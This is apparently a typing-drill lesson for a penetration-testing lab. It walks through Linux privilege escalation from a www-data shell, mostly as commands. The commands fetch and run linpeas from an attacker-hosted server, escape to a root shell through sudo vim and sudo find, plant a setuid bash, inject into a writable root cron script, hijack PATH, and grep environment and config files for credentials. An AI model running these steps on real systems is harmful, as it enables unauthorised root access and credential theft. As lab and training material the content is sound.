# Privilege Escalation - Typing

This lesson types a privilege-escalation pass from a low-privilege shell on
the lab target: enumerate the host, find the misconfiguration, escalate to
root, and capture the evidence. The session starts as the www-data user.

## Confirm the starting identity

The escalation starts by knowing exactly who the shell is.

```bash
# show the current identity
id

# show the account name
whoami

# show the hostname
hostname
```

The starting identity anchors the rest of the investigation.

## Read the environment

The account's context reveals its reach.

```bash
# show the current working directory
pwd

# list readable home directories
ls -la /home/

# show environment variables that may hold credentials
env | grep -iE 'pass|key|secret|token'
```

Environment variables occasionally leak service credentials.

## Run automated enumeration

Transfer and run the enumeration script on the target.

```bash
# on the attacker: fetch linpeas to the work folder
curl -LO https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh

# serve it from the work folder
cd exploit && python3 -m http.server 8080

# on the target: download and run linpeas
curl -s http://10.10.20.25:8080/linpeas.sh -o /tmp/linpeas.sh
chmod +x /tmp/linpeas.sh
/tmp/linpeas.sh > /tmp/linpeas.txt

# save a copy of the output for the evidence folder
cat /tmp/linpeas.txt
```

The script output lists every escalation candidate.

## Search the automated output

The findings hide in the script's highlighted sections.

```bash
# look for SUID binaries
grep -iE 'SUID|SGID' /tmp/linpeas.txt | grep -v '/' 

# look for sudo and capabilities lines
grep -iE 'sudo|cap_' /tmp/linpeas.txt

# look for writable cron and service files
grep -iE 'cron|writable' /tmp/linpeas.txt | head
```

Each highlighted line is a candidate to verify by hand.

## Confirm the sudo rules

The quickest escalations come from a permissive sudo rule.

```bash
# show what the current user may run as root
sudo -l
```

A rule that names an editable command is a path to a shell.

## Exploit a sudo command

A permitted editor or package manager becomes a root shell.

```bash
# if vim is permitted, open an editor as root
sudo /usr/bin/vim /etc/passwd

# inside vim: spawn a shell with the terminal escape
:!id

# alternatively, use the editor to read root-only files
sudo /usr/bin/vim /root/proof.txt
```

The command output inside the editor proves root execution.

## Find setuid binaries

Locate binaries that run with their owner's privileges.

```bash
# find setuid binaries owned by root
find / -perm -4000 -type f 2>/dev/null

# find setgid binaries
find / -perm -2000 -type f 2>/dev/null
```

The result list is compared against known dangerous binaries.

## Check binaries for capabilities

Capabilities give a binary specific privileges.

```bash
# find binaries with capabilities set
find / -type f -exec getcap {} + 2>/dev/null
```

A cap_setuid binary is an escalation candidate.

## Abuse a writable cron job

A root cron job that runs a writable script runs the tester's code.

```bash
# list the cron jobs
cat /etc/crontab
crontab -l

# inspect the scheduled script
ls -la /usr/local/bin/backup.sh

# write a proof command into the writable script
echo 'cp /root/proof.txt /tmp/proof-copy.txt' >> /usr/local/bin/backup.sh

# wait for the next cron run, then read the copy
cat /tmp/proof-copy.txt
```

A root-scheduled script is root execution on a timer.

## Use a shell escape from a permitted binary

A binary that can run subprocesses escapes into a shell.

```bash
# if find is permitted via sudo, escape to a shell
sudo find / -exec /bin/sh -i \;

# or use the write access to plant a setuid shell
sudo cp /bin/bash /usr/local/bin/rootbash
sudo chmod 4755 /usr/local/bin/rootbash

# run the setuid shell
/usr/local/bin/rootbash -p
```

The -p flag keeps the elevated privileges in a bash that checks them.

## Check the PATH for hijacking

A root process that runs a command from a writable directory can be tricked.

```bash
# show the PATH used by scripts
echo $PATH

# find writable directories on the system
find / -type d -writable 2>/dev/null | head

# plant a fake command ahead of the real one
cat > /tmp/ps <<'EOF'
#!/bin/bash
cp /root/proof.txt /tmp/path-proof.txt
/bin/ps "$@"
EOF

# make the fake command executable
chmod +x /tmp/ps
```

A script that runs as root and calls ps executes the planted version.

## Search for stored credentials

History and config files hold the account's own secrets.

```bash
# read shell history files
cat ~/.bash_history 2>/dev/null
cat /home/*/.bash_history 2>/dev/null

# search config files for password-like values
grep -rE 'password|passwd|secret|token' \
    /etc/ /opt/ /var/www/ 2>/dev/null | head
```

A discovered credential may move the shell to a more privileged account.

## Inspect running processes

A root service with a writable executable is a waiting escalation.

```bash
# list processes with their owners
ps aux

# show the full command lines of root processes
ps aux | awk '$1 == "root"'

# check for an NFS export with no root squashing
cat /etc/exports 2>/dev/null
```

Each root process and un-squashed export is a potential hijack target.

## Check the kernel version

The kernel is the last resort when configuration fails.

```bash
# show the kernel version
uname -a

# record the distribution and version
cat /etc/os-release
```

The version is matched against known kernel vulnerabilities only after the
configuration paths are exhausted.

## Confirm root

The escalation is proven by the identity, not by a guess.

```bash
# show the new identity
id

# confirm the effective user
whoami

# read the root-only proof file
cat /root/proof.txt
```

Root identity plus a root-owned read is the confirmation.

## Save the escalation evidence

Record the path exactly as it was run.

```bash
# write the escalation notes
cat > exploit/post/escalation.md <<'EOF'
# Privilege escalation

start: www-data
misconfiguration: sudo vim without a password
command: sudo /usr/bin/vim /etc/passwd
result: root shell
proof: /root/proof.txt
EOF

# show the notes
cat exploit/post/escalation.md
```

The notes make the finding reproducible for the client.

## Wrap up

Escalation sequence: identity -> automated scan -> sudo/SUID/capabilities ->
cron -> root -> proof -> notes.
